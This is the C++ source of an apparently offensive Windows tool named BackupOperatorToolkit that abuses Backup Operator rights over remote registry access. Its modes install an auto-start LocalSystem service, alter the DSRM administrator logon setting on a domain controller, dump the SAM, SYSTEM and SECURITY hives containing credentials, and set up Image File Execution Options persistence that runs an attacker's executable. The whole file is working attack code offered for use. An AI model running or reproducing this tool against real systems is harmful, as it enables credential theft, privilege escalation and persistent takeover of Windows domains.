#include <stdio.h>
#include <iostream>
#include <Windows.h>

LPCSTR mode = NULL;
LPCSTR behaviour = NULL;
LPCSTR dumppath = NULL;
LPCSTR servicepath = NULL;
LPCSTR target = NULL;
LPCSTR servicename = NULL;
LPCSTR displayname = NULL;
LPCSTR description = NULL;
LPCSTR username = NULL;
LPCSTR password = NULL;
LPCSTR domain = NULL;
LPCSTR ifeoservice = NULL;
LPCSTR ifeoservicepath = NULL;
DWORD value = NULL;


void help(){
	printf("Usage: BackupOperatorToolkit.exe SERVICE \\\\PATH\\To\\Service.exe \\\\TARGET.DOMAIN.DK SERVICENAME DISPLAYNAME DESCRIPTION\n");
	printf("Usage: BackupOperatorToolkit.exe DSRM \\\\TARGET.DOMAIN.DK 0||1||2\n");
	printf("Usage: BackupOperatorToolkit.exe DUMP \\\\PATH\\To\\Dump \\\\TARGET.DOMAIN.DK [!] If the dump path is local, the dump will be on the remote computer \n");
	printf("Usage: BackupOperatorToolkit.exe IFEO notepad.exe \\\\Path\\To\\pwn.exe \\\\TARGET.DOMAIN.DK \n");
}

void service(){
	HKEY hklm;
	HKEY hkey;
	DWORD result;

	const char* hives[] = { "SYSTEM\\CurrentControlSet\\Services", "SYSTEM\\CurrentControlSet\\Services\\"};

	result = RegConnectRegistryA(target, HKEY_LOCAL_MACHINE, &hklm);
	if (result != 0) {
		printf("[-] RegConnectRegistryA: %d\n", result);
		exit(0);
	}
	printf("[+] Connecting to Services registry hive\n");
	result = RegOpenKeyExA(hklm, hives[0], REG_OPTION_BACKUP_RESTORE | REG_OPTION_OPEN_LINK, KEY_READ, &hkey);
	if (result != 0) {
		printf("[-] RegOpenKeyExA: %d\n", result);
		exit(0);
	}

	printf("[+] Creating Service key %s\n", servicename);
	DWORD disposition = 0;
	HKEY svckey = NULL;
	result = RegCreateKeyExA(hkey, servicename, NULL, NULL, REG_OPTION_BACKUP_RESTORE, KEY_WRITE, NULL, &svckey, &disposition);
	if (result != 0) {
		printf("[-] Service Key: %d\n", result);
		exit(0);
	}

	printf("[+] Setting Service to Auto start\n");
	DWORD dwStart = SERVICE_AUTO_START;
	result = RegSetKeyValueA(svckey, NULL, "Start", REG_DWORD, &dwStart, sizeof(DWORD));
	if (result != 0) {
		printf("[-] Auto Start Key: %d\n", result);
		exit(0);
	}

	printf("[+] Setting Service Type\n");
	DWORD dwType = SERVICE_WIN32_OWN_PROCESS;
	result = RegSetKeyValueA(svckey, NULL, "Type", REG_DWORD, &dwType, sizeof(DWORD));
	if (result != 0) {
		printf("[-] Service Type: %d\n", result);
		exit(0);
	}

	printf("[+] Setting Recovery Action\n");
	DWORD dwErrorControl = 1;
	result = RegSetKeyValueA(svckey, NULL, "ErrorControl", REG_DWORD, &dwErrorControl, sizeof(DWORD));
	if (result != 0) {
		printf("[-] Recovery: %d\n", result);
		exit(0);
	}

	printf("[+] Setting Service to run with Local System\n");
	char szObjectName[] = "LocalSystem";
	result = RegSetKeyValueA(svckey, NULL, "ObjectName", REG_SZ, &szObjectName[0], sizeof(szObjectName));
	if (result != 0) {
		printf("[-] Local System Key: %d\n", result);
		exit(0);
	}

	printf("[+] Setting Service DisplayName to %s\n", displayname);
	result = RegSetKeyValueA(svckey, NULL, "DisplayName", REG_SZ, displayname, strlen(displayname) + 1);
	if (result != 0) {
		printf("[-] DisplayName: %d\n", result);
		exit(0);
	}

	printf("[+] Setting Service Description to %s\n", description);
	result = RegSetKeyValueA(svckey, NULL, "Description", REG_SZ, description, strlen(description) + 1);
	if (result != 0) {
		printf("[-] Description: %d\n", result);
		exit(0);
	}

	printf("[+] Setting Service Path to %s\n", servicepath);
	result = RegSetKeyValueA(svckey, NULL, "ImagePath", REG_EXPAND_SZ, servicepath, strlen(servicepath) + 1);
	if (result != 0) {
		printf("[-] Service Path: %d\n", result);
		exit(0);
	}

	result = RegCloseKey(hkey);
	if (result != 0) {
		printf("[-] RegCloseKey: %d\n", result);
		exit(0);
	}

	printf("\nThe service will be executed when the machine is rebooted.\n");
}

void dsrm() {
	HKEY hklm;
	HKEY hkey;
	DWORD result;

	const char* hives = "SYSTEM\\CURRENTCONTROLSET\\CONTROL\\LSA";

	result = RegConnectRegistryA(target, HKEY_LOCAL_MACHINE, &hklm);
	if (result != 0) {
		printf("[-] RegConnectRegistryW: %d\n", result);
		exit(0);
	}

	printf("[+] Opening target hive to write\n");
	result = RegOpenKeyExA(hklm, hives, REG_OPTION_BACKUP_RESTORE | REG_OPTION_OPEN_LINK, KEY_READ, &hkey);
	if (result != 0) {
		printf("[-] RegOpenKeyExA: %d\n", result);
		exit(0);
	}
	printf("[+] Setting DsrmAdminLogonBehavior value to %lu\n", value);
	result = RegSetValueExA(hkey, "DsrmAdminLogonBehavior", NULL, REG_DWORD, (const BYTE*)&value, sizeof(value));
	if (result != 0) {
		printf("[-] RegSetValueExA: %d\n", result);
		exit(0);
	}
	result = RegCloseKey(hkey);
	if (result != 0) {
		printf("[-] RegCloseKey: %d\n", result);
		exit(0);
	}
	
}

void dump() {
	HKEY hklm;
	HKEY hkey;
	DWORD result;

	const char* hives[] = { "SAM","SYSTEM","SECURITY" };

	result = RegConnectRegistryA(target, HKEY_LOCAL_MACHINE, &hklm);
	if (result != 0) {
		printf("[-] RegConnectRegistryW: %d\n", result);
		exit(0);
	}
	for (int i = 0; i < 3; i++) {
		printf("[+] Connecting to registry hive\n");
		printf("[+] hive: %s\n", hives[i]);
		result = RegOpenKeyExA(hklm, hives[i], REG_OPTION_BACKUP_RESTORE | REG_OPTION_OPEN_LINK, KEY_READ, &hkey);
		if (result != 0) {
			printf("[-] RegOpenKeyExA: %d\n", result);
			exit(0);
		}
		printf("[+] Dumping hive to %s\n", dumppath);
		result = RegSaveKeyA(hkey, std::string(dumppath).append(hives[i]).c_str(), NULL);
		if (result != 0) {
			printf("RegSaveKeyA: %d\n", result);
			exit(0);
		}
	}
}

void ifeo() {
	HKEY hklm;
	HKEY hkey;
	DWORD result;

	const char* hives[] = { "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\", "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\" };
	

	result = RegConnectRegistryA(target, HKEY_LOCAL_MACHINE, &hklm);
	if (result != 0) {
		printf("[-] RegConnectRegistryW: %d\n", result);
	}

	printf("[+] Connecting to Image File Execution Options registry hive\n");
	result = RegOpenKeyExA(hklm, hives[0], REG_OPTION_BACKUP_RESTORE | REG_OPTION_OPEN_LINK, KEY_READ, &hkey);
	if (result != 0) {
		printf("[-] RegOpenKeyExA: %d\n", result);
		exit(0);
	}

	printf("[+] Creating ifeo process key %s\n", ifeoservice);
	DWORD disposition = 0;
	HKEY ifeokey = NULL;
	result = RegCreateKeyExA(hkey, ifeoservice, NULL, NULL, REG_OPTION_BACKUP_RESTORE, KEY_WRITE, NULL, &ifeokey, &disposition);
	if (result != 0) {
		printf("[-] Process Key: %d\n", result);
		exit(0);
	}

	printf("[+] Setting GlobalFlag\n");
	DWORD value = 512;
	LPCSTR Global = "GlobalFlag";
	result = RegSetKeyValueA(ifeokey, NULL, Global, REG_DWORD, (LPBYTE)&value, sizeof(value));
	if (result != 0) {
		printf("[-] GlobalFlag: %d\n", result);
		exit(0);
	}

	printf("[+] Connecting to SilentProcessExit registry hive\n");
	result = RegOpenKeyExA(hklm, hives[1], REG_OPTION_BACKUP_RESTORE | REG_OPTION_OPEN_LINK, KEY_READ, &hkey);
	if (result != 0) {
		printf("[-] RegOpenKeyExA: %d\n", result);
		exit(0);
	}

	printf("[+] Creating ifeo process key %s\n", ifeoservice);
	result = RegCreateKeyExA(hkey, ifeoservice, NULL, NULL, REG_OPTION_BACKUP_RESTORE, KEY_WRITE, NULL, &ifeokey, &disposition);
	if (result != 0) {
		printf("[-] Process Key: %d\n", result);
		exit(0);
	}

	printf("[+] Setting ReportingMode\n");
	DWORD ReportingMode = 1;
	result = RegSetKeyValueA(ifeokey, NULL, "ReportingMode", REG_DWORD, (LPBYTE)&ReportingMode, sizeof(ReportingMode));
	if (result != 0) {
		printf("[-] ReportingMode: %d\n", result);
		exit(0);
	}
	printf("[+] Setting MonitorProcess\n");
	result = RegSetKeyValueA(ifeokey, NULL, "MonitorProcess", REG_SZ, (LPBYTE)ifeoservicepath, strlen(ifeoservicepath));
	if (result != 0) {
		printf("[-] MonitorProcess: %d\n", result);
		exit(0);
	}

	printf("\nThe executable will be run when the specified process is exited.\n");

}

int main(int argc, LPCSTR argv[])
{
	if (argc < 2) {
		help();
		return 0;
	}
	mode = argv[1];
	if (strcmp(mode, "SERVICE") == 0) {
		if (argc < 7) {
			help();
			return 0;
		}
		printf("SERVICE MODE\n");
		servicepath = argv[2];
		target = argv[3];
		servicename = argv[4];
		displayname = argv[5];
		description = argv[6];
		service();
	}
	else if (strcmp(mode, "DSRM") == 0) {
		if (argc < 4) {
			help();
			return 0;
		}
		printf("DSRM MODE\n");
		target = argv[2];
		value = atoi(argv[3]);
		dsrm();
	}
	else if (strcmp(mode, "DUMP") == 0) {
		if (argc < 4) {
			help();
			return 0;
		}
		printf("DUMP MODE\n");
		dumppath = argv[2];
		target = argv[3];
		dump();
	}
	else if (strcmp(mode, "IFEO") == 0) {
		if (argc < 4) {
			help();
			return 0;
		}
		printf("IFEO MODE\n");
		ifeoservice = argv[2];
		ifeoservicepath = argv[3];
		target = argv[4];
		ifeo();
	}

	else {
		help();
		return 0;
	}
	return 0;
}

